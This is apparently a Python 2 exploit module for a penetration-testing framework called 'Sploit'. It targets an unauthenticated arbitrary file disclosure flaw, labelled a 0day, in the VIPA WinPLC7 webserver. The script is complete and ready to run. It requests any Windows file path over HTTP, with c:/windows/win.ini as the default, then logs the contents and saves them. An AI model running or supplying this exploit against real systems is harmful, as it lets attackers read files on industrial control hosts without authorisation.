#!/usr/bin/env python

import urllib2
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_winplc7_webserver_arbitrary_file_disclosure"
INFO['DESCRIPTION'] = "WinPLC7 Webserver Arbitrary File Disclosure"
INFO['VENDOR'] = "http://www.vipa.com"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Vulnerability allows unauthenticated user to read contents of arbitrary file on remote machine. Path to file can not\
contains spaces.
Tested against WinPLC7 5.046 and 6.04 on Windows 7 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://www.vipa.com/service-support/downloads/software/"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "31 Aug, 2017. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 80
OPTIONS["FILENAME"] = "c:/windows/win.ini"


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])
        self.filename = self.filename.replace('/', '\\').replace(' ','%20')

    def make_url(self, path=''):
        url = 'http://%s:%s/%s' % (self.host, self.port, path)
        return url

    def run(self):
        # Get options from gui
        self.args()
        self.log('[*] Trying to get %s' % (self.filename))
        resp = urllib2.urlopen(self.make_url(self.filename)).read()
        if len(resp) < 10000:
            self.log('[+]\r\n' + resp)
        self.writefile(resp)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()